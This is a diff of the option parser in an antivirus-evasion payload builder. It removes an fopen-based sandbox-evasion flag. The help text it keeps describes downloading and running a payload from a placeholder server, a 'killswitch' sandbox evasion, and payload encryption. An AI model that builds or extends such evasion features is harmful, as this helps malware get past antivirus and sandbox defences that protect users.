@@ -27,8 +27,7 @@ int main (int argc, char **argv)
 	char *kvalue = NULL;
 	char *uvalue = NULL;
 	char *wvalue = NULL;
-	int hflag = 0;
-	int Fflag = 0;
+	int hflag = 0;	
 	int Xflag = 0;
 	int Eflag = 0;
 	int Aflag = 0;
@@ -41,7 +40,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:f:k:u:d:w:lphFXEAq")) != -1)
+	while ((c = getopt (argc, argv, "e:f:k:u:d:w:lphXEAq")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -67,10 +66,7 @@ int main (int argc, char **argv)
 				break;
 			case 'h':
 				hflag = 1;
-				break;
-			case 'F':
-				Fflag = 1;
-				break;
+				break;			
 			case 'X':
 				Xflag = 1;
 				break;
@@ -197,11 +193,7 @@ int main (int argc, char **argv)
 
 	//write LVALUE to defs.h
 	if(print_debug)
-		fprintf (file_def, "#define PRINT_DEBUG\n");
-
-	//write SANDBOX_FOPEN to defs.h
-	if(Fflag)
-		fprintf (file_def, "#define SANDBOX_FOPEN\n");
+		fprintf (file_def, "#define PRINT_DEBUG\n");	
 
 	//write X64 to defs.h
 	if(Xflag)
@@ -267,8 +259,7 @@ void print_help()
 	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
 	printf("   Can be used with -l\n");
-	//printf("-A use metasploits ASCII encryption, usage is like -E\n");
-	printf("-F use fopen sandbox evasion\n");
+	//printf("-A use metasploits ASCII encryption, usage is like -E\n");	
 	printf("-k \"killswitch\" sandbox evasion with gethostbyname\n");
 	printf("-X compile for 64 bit\n");
 	printf("-p print debug information\n");
